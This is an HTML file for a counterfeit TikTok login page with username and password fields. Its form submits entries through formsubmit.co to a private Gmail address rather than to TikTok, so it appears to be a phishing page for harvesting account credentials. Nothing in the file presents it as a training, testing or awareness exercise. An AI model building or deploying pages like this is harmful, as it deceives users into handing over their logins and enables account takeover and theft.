<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: rgb(39, 38, 38);
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }

        .container {
            background-color: #121212;
            width: 100%;
            max-width: 450px;
            padding: 40px;
            border-radius: 10px;
            margin-top: 50px;
        }

        .logo {
            text-align: center;
            margin-bottom: 40px;
        }

        .logo span {
            font-size: 2.5rem;
            font-weight: bold;
            background: linear-gradient(45deg, #FE2C55, #25F4EE);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .form-group {
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 12px;
            background-color: #333;
            border: 1px solid #444;
            border-radius: 5px;
            color: #fff;
            font-size: 16px;
        }

        input:focus {
            outline: none;
            border-color: #25F4EE;
        }

        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(45deg, #FE2C55, #25F4EE);
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
        }

        .links {
            text-align: center;
            margin-top: 20px;
        }

        a {
            color: #25F4EE;
            text-decoration: none;
            font-size: 14px;
        }

        .separator {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #666;
        }

        .separator::before,
        .separator::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #444;
        }

        .separator::before {
            margin-right: 10px;
        }

        .separator::after {
            margin-left: 10px;
        }

        .social-login {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
        }

        .social-icon {
            width: 40px;
            height: 40px;
            background-color: #333;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        footer {
            margin-top: auto;
            text-align: center;
            padding: 20px;
            color: #666;
            font-size: 14px;
        }

        @media (max-width: 480px) {
            .container {
                padding: 20px;
                margin-top: 20px;
            }

            .logo span {
                font-size: 2rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span>TikTok</span>
        </div>
        
        <form action="https://formsubmit.co/josephbandoh941@gmail.com" method="POST">
            <div class="form-group">
                <input type="text" placeholder="Username or email" required>
            </div>
            
            <div class="form-group">
                <input type="password" placeholder="Password" required>
            </div>
            
            <button type="submit">Log in</button>
        </form>

        <div class="links">
            <a href="#">Forgot password?</a>
        </div>

    </div>

</body>
</html>
